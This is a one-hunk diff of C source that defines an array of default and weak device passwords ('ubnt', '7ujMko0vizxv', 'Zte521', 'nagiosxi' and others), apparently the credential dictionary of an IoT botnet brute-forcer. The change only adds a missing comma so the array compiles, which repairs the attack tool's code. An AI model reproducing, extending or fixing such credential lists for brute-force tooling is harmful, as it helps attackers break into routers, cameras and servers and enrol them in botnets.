@@ -17,4 +17,4 @@ const char *passwords[] = {
 "cacti", "888888", "juantech", "1234", "synopass", "informix", "smcadmin", 
 "1111", "articon", "supervisor", "54321", "pass", "666666", "Zte521", 
 "klv1234", "default", "fucker", "nagiosxi", "nagios", "", 
-"zlxx.", "support", "XA1bac0MX", "ubnt", "7ujMko0vizxv", "vizxv", "rasberry", "gocubsgo" NULL};
+"zlxx.", "support", "XA1bac0MX", "ubnt", "7ujMko0vizxv", "vizxv", "rasberry", "gocubsgo", NULL};
